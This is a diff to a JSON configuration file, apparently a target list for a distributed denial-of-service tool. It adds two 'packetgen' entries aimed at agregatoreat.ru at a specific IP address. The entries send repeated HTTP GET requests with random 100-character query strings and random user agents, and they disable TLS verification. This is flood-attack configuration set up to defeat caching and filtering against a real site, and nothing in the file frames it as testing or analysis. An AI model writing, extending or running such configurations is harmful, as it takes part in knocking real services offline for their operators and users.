@@ -7358,6 +7358,66 @@
       "count": 3
     },
     {
+      "type": "packetgen",
+      "name": "agregatoreat.ru",
+      "args": {
+        "dynamic": true,
+        "connection": {
+          "type": "net",
+          "args": {
+            "protocol": "tcp",
+            "address": "84.201.185.57:443",
+            "tls_config": {
+              "insecure_skip_verify": true
+            }
+          }
+        },
+        "packet": {
+          "payload": {
+            "type": "http",
+            "data": {
+              "method": "GET",
+              "path": "https://agregatoreat.ru/classifier/ktru-list/?v={{ random_alphanum 100 }}",
+              "headers": {
+                "User-Agent": "{{ random_user_agent }}"
+              }
+            }
+          }
+        }
+      },
+      "count": 3
+    },
+    {
+      "type": "packetgen",
+      "name": "agregatoreat.ru",
+      "args": {
+        "dynamic": false,
+        "connection": {
+          "type": "net",
+          "args": {
+            "protocol": "tcp",
+            "address": "84.201.185.57:443",
+            "tls_config": {
+              "insecure_skip_verify": true
+            }
+          }
+        },
+        "packet": {
+          "payload": {
+            "type": "http",
+            "data": {
+              "method": "GET",
+              "path": "https://agregatoreat.ru/classifier/ktru-list",
+              "headers": {
+                "User-Agent": "{{ random_user_agent }}"
+              }
+            }
+          }
+        }
+      },
+      "count": 3
+    },
+    {
       "type": "encrypted",
       "args": {
         "format": "json",
